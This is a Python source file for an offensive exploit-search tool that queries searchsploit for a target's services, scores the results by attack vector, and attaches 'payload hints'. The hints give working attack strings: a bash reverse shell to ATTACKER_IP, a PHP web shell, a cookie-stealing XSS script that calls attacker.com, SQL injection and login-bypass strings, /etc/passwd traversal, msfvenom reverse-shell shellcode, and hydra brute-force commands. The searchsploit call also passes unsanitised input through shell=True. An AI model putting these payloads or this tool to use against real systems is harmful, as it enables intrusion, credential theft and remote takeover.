
import subprocess
import json
import re
import os
from datetime import datetime

class EnhancedExploitSearcher:
    def __init__(self, data_dir):
        self.data_dir = data_dir
        self.tool_dir = os.path.join(data_dir, 'exploit_search')
        os.makedirs(self.tool_dir, exist_ok=True)
        
        # Enhanced attack vector detection patterns rreally unoptimized needs work
        self.attack_patterns = {
            'remote_code_execution': [
                r'remote.*code.*execution', r'rce', r'command.*injection',
                r'arbitrary.*command', r'execute.*command', r'shell.*injection',
                r'cmd.*injection', r'system\(\)', r'exec\(\)'
            ],
            'sql_injection': [
                r'sql.*injection', r'sqli', r'blind.*sql', r'union.*select',
                r'boolean.*blind', r'time.*based', r'database.*injection'
            ],
            'xss': [
                r'cross.*site.*scripting', r'xss', r'javascript.*injection',
                r'dom.*based', r'stored.*xss', r'reflected.*xss'
            ],
            'buffer_overflow': [
                r'buffer.*overflow', r'stack.*overflow', r'heap.*overflow',
                r'arbitrary.*write', r'memory.*corruption', r'segmentation.*fault'
            ],
            'denial_of_service': [
                r'denial.*of.*service', r'dos', r'ddos', r'crash',
                r'service.*disruption', r'resource.*exhaustion'
            ],
            'authentication_bypass': [
                r'authentication.*bypass', r'auth.*bypass', r'login.*bypass',
                r'credential.*bypass', r'password.*bypass'
            ],
            'privilege_escalation': [
                r'privilege.*escalation', r'privesc', r'escalate.*privilege',
                r'root.*access', r'admin.*access', r'elevation.*of.*privilege'
            ],
            'directory_traversal': [
                r'directory.*traversal', r'path.*traversal', r'\.\./\.\./',
                r'arbitrary.*file.*read', r'file.*disclosure'
            ],
            'information_disclosure': [
                r'information.*disclosure', r'info.*leak', r'data.*exposure',
                r'sensitive.*data', r'credential.*leak'
            ],
            'file_upload': [
                r'file.*upload', r'arbitrary.*file.*upload', r'unrestricted.*upload',
                r'malicious.*file', r'upload.*bypass'
            ]
        }
        
        # Severity scoring system
        self.severity_scores = {
            'critical': {'score': 10, 'keywords': ['critical', 'rce', 'remote code execution', '0day', 'zero-day']},
            'high': {'score': 7, 'keywords': ['high', 'privilege escalation', 'sql injection', 'authentication bypass']},
            'medium': {'score': 5, 'keywords': ['medium', 'xss', 'directory traversal', 'information disclosure']},
            'low': {'score': 3, 'keywords': ['low', 'information', 'disclosure', 'info']}
        }
        
        # Service-specific exploit mapping
        self.service_exploit_map = {
            'ssh': ['openssh', 'ssh', 'dropbear', 'ssh server', 'secure shell'],
            'nginx': ['nginx', 'http server', 'web server'],
            'apache': ['apache', 'httpd', 'web server', 'apache http'],
            'mysql': ['mysql', 'mariadb', 'database'],
            'ftp': ['ftp', 'ftpd', 'pure-ftpd', 'vsftpd', 'proftpd'],
            'postgresql': ['postgres', 'postgresql', 'pgsql'],
            'redis': ['redis'],
            'docker': ['docker'],
            'wordpress': ['wordpress', 'wp'],
            'joomla': ['joomla'],
            'drupal': ['drupal']
        }
        
        # Common exploit keywords that should be filtered out
        self.irrelevant_keywords = [
            'cisco', 'juniper', 'palo', 'fortinet', 'checkpoint', 'sophos',
            'android', 'ios', 'iphone', 'ipad', 'windows phone',
            'oracle', 'sap', 'ibm', 'salesforce',
            'router', 'switch', 'firewall', 'load balancer',
            'printer', 'scanner', 'camera', 'iot'
        ]
    
    def detect_attack_vector(self, title):
        title_lower = title.lower()
        
        for vector, patterns in self.attack_patterns.items():
            for pattern in patterns:
                if re.search(pattern, title_lower):
                    return vector
        
        # Fallback detection based on common patterns
        if 'injection' in title_lower:
            if 'sql' in title_lower:
                return 'sql_injection'
            elif 'command' in title_lower or 'cmd' in title_lower:
                return 'remote_code_execution'
            elif 'javascript' in title_lower or 'script' in title_lower:
                return 'xss'
        
        if 'overflow' in title_lower:
            return 'buffer_overflow'
        
        if 'bypass' in title_lower:
            if 'auth' in title_lower or 'login' in title_lower:
                return 'authentication_bypass'
            return 'privilege_escalation'
        
        if 'traversal' in title_lower or '../' in title_lower:
            return 'directory_traversal'
        
        if 'disclosure' in title_lower or 'leak' in title_lower:
            return 'information_disclosure'
        
        if 'upload' in title_lower:
            return 'file_upload'
        
        if 'crash' in title_lower or 'dos' in title_lower:
            return 'denial_of_service'
        
        return 'unknown'
    
    def calculate_severity(self, title, attack_vector):
        """Calculate severity with enhanced scoring."""
        title_lower = title.lower()
        
        # Base score from attack vector
        base_scores = {
            'remote_code_execution': 9,
            'sql_injection': 8,
            'buffer_overflow': 8,
            'privilege_escalation': 7,
            'authentication_bypass': 6,
            'directory_traversal': 5,
            'xss': 4,
            'information_disclosure': 3,
            'file_upload': 4,
            'denial_of_service': 3,
            'unknown': 2
        }
        
        score = base_scores.get(attack_vector, 2)
        
        # Adjust based on keywords in title
        if 'critical' in title_lower or '0day' in title_lower or 'zero-day' in title_lower:
            score += 3
        
        if 'high' in title_lower or 'remote root' in title_lower or 'arbitrary code' in title_lower:
            score += 2
        
        if 'metasploit' in title_lower or 'exploit' in title_lower:
            score += 1
        
        if 'poc' in title_lower or 'proof of concept' in title_lower:
            score -= 1
        
        # Adjust based on service (some services are more critical)
        if 'openssh' in title_lower and 'privilege' in title_lower:
            score += 2  # SSH privilege escalation is critical
        if 'mysql' in title_lower and 'root' in title_lower:
            score += 2  # MySQL root access is critical
        
        # Convert score to severity label
        if score >= 9:
            return 'critical', score
        elif score >= 7:
            return 'high', score
        elif score >= 5:
            return 'medium', score
        else:
            return 'low', score
    # Payload Hint
    def get_payload_hints(self, attack_vector, service_name):
        base_hints = {
            'remote_code_execution': [
                "Command injection: ; whoami",
                "Reverse shell: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1",
                "Web shell: <?php system($_GET['cmd']); ?>"
            ],
            'sql_injection': [
                "Union-based: ' UNION SELECT username, password FROM users--",
                "Error-based: ' AND 1=CAST((SELECT version()) AS INT)--",
                "Time-based: ' AND IF(1=1,SLEEP(5),0)--"
            ],
            'xss': [
                "Basic: <script>alert('XSS')</script>",
                "DOM-based: <img src=x onerror=alert(1)>",
                "Steal cookies: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
            ],
            'buffer_overflow': [
                "Pattern creation: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000",
                "Shellcode generation: msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f python",
                "Return address: Use !mona findmsp in Immunity Debugger"
            ],
            'authentication_bypass': [
                "SQL injection in login: ' OR '1'='1'--",
                "Cookie manipulation: admin=true; authenticated=1",
                "Parameter tampering: ?admin=1&authenticated=true"
            ],
            'privilege_escalation': [
                "SUID binaries: find / -perm -4000 2>/dev/null",
                "Kernel exploits: searchsploit linux kernel version",
                "Sudo misconfigurations: sudo -l"
            ],
            'directory_traversal': [
                "Basic: ../../../etc/passwd",
                "Encoded: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "Null byte: ../../../etc/passwd%00.jpg"
            ],
            'information_disclosure': [
                "Check for: /config.php, /.env, /.git/HEAD",
                "Error pages: Add ' to parameters to trigger errors",
                "Backup files: backup.zip, database.sql.bak"
            ]
        }
        
        hints = base_hints.get(attack_vector, ["Check exploit file for specific payload details"])
        
        # Add service-specific hints
        if service_name:
            service_hints = {
                'ssh': [
                    "Brute force: hydra -l root -P passwords.txt ssh://TARGET_IP",
                    "Private key: ssh -i id_rsa user@TARGET_IP",
                    "Default credentials: root:root, admin:admin"
                ],
                'nginx': [
                    "Path traversal: GET /static/../../../etc/passwd",
                    "CRLF injection: %0d%0aSet-Cookie: malicious=payload",
                    "Configuration files: /nginx.conf, /conf/nginx.conf"
                ],
                'mysql': [
                    "Default credentials: root:, root:root, admin:admin",
                    "SQL injection: UNION SELECT @@version",
                    "File read: LOAD_FILE('/etc/passwd')"
                ],
                'ftp': [
                    "Anonymous login: ftp anonymous@TARGET_IP",
                    "Brute force: hydra -l ftp -P passwords.txt ftp://TARGET_IP",
                    "Default credentials: anonymous:, ftp:ftp"
                ]
            }
            
            for service_key, service_hint_list in service_hints.items():
                if service_key in service_name.lower():
                    hints = service_hint_list + hints
                    break
        
        return hints
    
    def filter_irrelevant_exploits(self, exploits, service_name):
        relevant_exploits = []
        service_lower = service_name.lower()
        
        for exploit in exploits:
            title = exploit.get('title', '').lower()
            
            # Skip if contains irrelevant keywords
            if any(keyword in title for keyword in self.irrelevant_keywords):
                continue
            
            # Check for service relevance
            is_relevant = False
            
            # Check service-specific keywords
            for service_key, keywords in self.service_exploit_map.items():
                if service_key in service_lower:
                    if any(keyword in title for keyword in keywords):
                        is_relevant = True
                        break
            
            # If not matched by service map, check for generic relevance
            if not is_relevant:
                # Check for general web server exploits for HTTP services
                if 'http' in service_lower or 'nginx' in service_lower or 'apache' in service_lower:
                    if any(word in title for word in ['http', 'web', 'server', 'nginx', 'apache']):
                        is_relevant = True
            
            if is_relevant:
                relevant_exploits.append(exploit)
        
        return relevant_exploits
    
    def search_exploits(self, service_name, version="", target_ip="", target_url=""):
        """Enhanced exploit search with better filtering."""
        # ── Skip generic / protocol-only service names ──
        # These produce thousands of irrelevant results (e.g. every Apache
        # exploit ever made when the service is just "http").
        generic_skip = {
            'http', 'https', 'https-alt', 'http-proxy', 'http-alt',
            'tcpwrapped', 'unknown', 'domain', 'jetdirect',
            'tcp', 'udp', 'ssl', 'tls',
        }
        clean_name = service_name.strip().lower().split()[0] if service_name else ''
        if clean_name in generic_skip:
            # Nothing specific to search — skip entirely
            return []

        print(f"[EXPLOIT] Searching for {service_name} {version}")
        
        # Get relevant search terms
        search_terms = self.get_search_terms(service_name, version)
        
        all_exploits = []
        
        for term in search_terms[:3]:  # Try top 3 most relevant terms
            try:
                cmd = f"searchsploit {term} --json 2>/dev/null"
                result = subprocess.run(
                    cmd,
                    shell=True,
                    timeout=30,
                    capture_output=True,
                    text=True
                )
                
                if result.stdout:
                    try:
                        data = json.loads(result.stdout)
                        exploits = data.get('RESULTS_EXPLOIT', [])
                        
                        for exploit in exploits:
                            exploit_info = self.process_exploit(
                                exploit, service_name, version, target_ip, target_url
                            )
                            
                            # Skip if it's clearly irrelevant
                            if not self.is_clearly_irrelevant(exploit_info, service_name):
                                all_exploits.append(exploit_info)
                                
                    except json.JSONDecodeError:
                        self.parse_text_output(result.stdout, service_name, version, 
                                             target_ip, target_url, all_exploits)
                
            except Exception as e:
                print(f"[!] Search error for {term}: {e}")
                continue
        
        # Filter out irrelevant exploits
        relevant_exploits = self.filter_irrelevant_exploits(all_exploits, service_name)
        
        # Sort by severity and relevance
        relevant_exploits.sort(key=lambda x: (-x.get('severity_score', 0), x.get('title', '')))
        
        # Save to file
        self.save_exploits_to_file(relevant_exploits, service_name, target_ip)
        
        return relevant_exploits[:15]  # Return top 15
    
    def get_search_terms(self, service_name, version):
        terms = []
        service_lower = service_name.lower()
        
        # Clean service name
        clean_service = service_lower.split()[0] if ' ' in service_lower else service_lower
        
        # Base term
        terms.append(clean_service)
        
        # Version-specific terms
        if version:
            # Extract version numbers
            version_match = re.search(r'(\d+\.\d+(\.\d+)*)', version)
            if version_match:
                full_version = version_match.group(1)
                terms.append(f"{clean_service} {full_version}")
                
                # Major version only
                major_version = full_version.split('.')[0]
                terms.append(f"{clean_service} {major_version}")
        
        # Service-specific additional terms
        service_terms = {
            'ssh': ['openssh'],
            'nginx': ['nginx http', 'nginx server'],
            'apache': ['apache http', 'httpd'],
            'mysql': ['mysql database'],
            'ftp': ['pure-ftpd', 'ftpd'],
            'postgresql': ['postgres', 'postgresql'],
            'redis': ['redis'],
            'docker': ['docker'],
            'wordpress': ['wordpress', 'wp'],
            'joomla': ['joomla'],
            'drupal': ['drupal']
        }
        
        for service_key, additional_terms in service_terms.items():
            if service_key in service_lower:
                terms.extend(additional_terms)
                break
        
        # Remove duplicates and return
        return list(dict.fromkeys(terms))
    
    def is_clearly_irrelevant(self, exploit_info, service_name):
        title = exploit_info.get('title', '').lower()
        service_lower = service_name.lower()
        
        # Skip Windows exploits for Linux services
        if 'windows' in title and ('linux' in service_lower or 'ubuntu' in service_lower):
            return True
        
        # Skip Cisco/network device exploits for web services
        network_devices = ['cisco', 'juniper', 'palo', 'fortinet', 'router', 'switch']
        if any(device in title for device in network_devices) and 'http' in service_lower:
            return True
        
        # Skip mobile/desktop app exploits
        mobile_apps = ['android', 'ios', 'iphone', 'windows phone', 'desktop']
        if any(app in title for app in mobile_apps):
            return True
        
        return False
    
    def process_exploit(self, exploit_data, service_name, version, target_ip, target_url):
        title = exploit_data.get('Title', '')
        path = exploit_data.get('Path', '')
        
        # Detect attack vector
        attack_vector = self.detect_attack_vector(title)
        
        # Calculate severity
        severity, severity_score = self.calculate_severity(title, attack_vector)
        
        # Get payload hints
        payload_hints = self.get_payload_hints(attack_vector, service_name)
        
        # Extract CVE
        cve_match = re.search(r'(CVE-\d{4}-\d+)', title, re.IGNORECASE)
        cve = cve_match.group(0) if cve_match else ""
        
        return {
            'title': title,
            'path': path,
            'cve': cve,
            'attack_vector': attack_vector,
            'severity': severity,
            'severity_score': severity_score,
            'payload_hints': payload_hints[:3],  # Top 3 hints
            'service': service_name,
            'version': version,
            'target_ip': target_ip,
            'target_url': target_url,
            'date': exploit_data.get('Date', ''),
            'platform': exploit_data.get('Platform', '')
        }


    def parse_text_output(self, text, service_name, version, target_ip, target_url, exploits_list):
        lines = text.split('\n')
        
        for line in lines:
            if '|' in line and 'Exploit:' not in line:
                parts = line.split('|')
                if len(parts) >= 3:
                    title = parts[1].strip()
                    
                    exploit_info = self.process_exploit({
                        'Title': title,
                        'Path': parts[0].strip() if len(parts) > 0 else '',
                        'Date': parts[2].strip() if len(parts) > 2 else '',
                        'Platform': parts[3].strip() if len(parts) > 3 else ''
                    }, service_name, version, target_ip, target_url)
                    
                    if not self.is_clearly_irrelevant(exploit_info, service_name):
                        exploits_list.append(exploit_info)

    # File writting 
    def save_exploits_to_file(self, exploits, service_name, target_ip):
        safe_service = re.sub(r'[^a-zA-Z0-9]', '_', service_name)
        safe_ip = re.sub(r'[^a-zA-Z0-9]', '_', target_ip) if target_ip else 'unknown'
        
        filename = f"exploits_{safe_service}_{safe_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = os.path.join(self.tool_dir, filename)
        
        with open(filepath, 'w') as f:
            f.write(f"Exploit Search Results\n")
            f.write(f"Service: {service_name}\n")
            f.write(f"Target: {target_ip}\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            for i, exploit in enumerate(exploits[:50], 1):  # Top 50
                f.write(f"{i}. {exploit['title']}\n")
                f.write(f"   Attack Vector: {exploit['attack_vector']}\n")
                f.write(f"   Severity: {exploit['severity']}\n")
                
                if exploit.get('cve'):
                    f.write(f"   CVE: {exploit['cve']}\n")
                
                if exploit.get('payload_hints'):
                    f.write(f"   Payload Hints:\n")
                    for hint in exploit['payload_hints'][:3]:
                        f.write(f"     - {hint}\n")
                
                f.write(f"   Path: {exploit.get('path', 'N/A')}\n")
                f.write("\n")
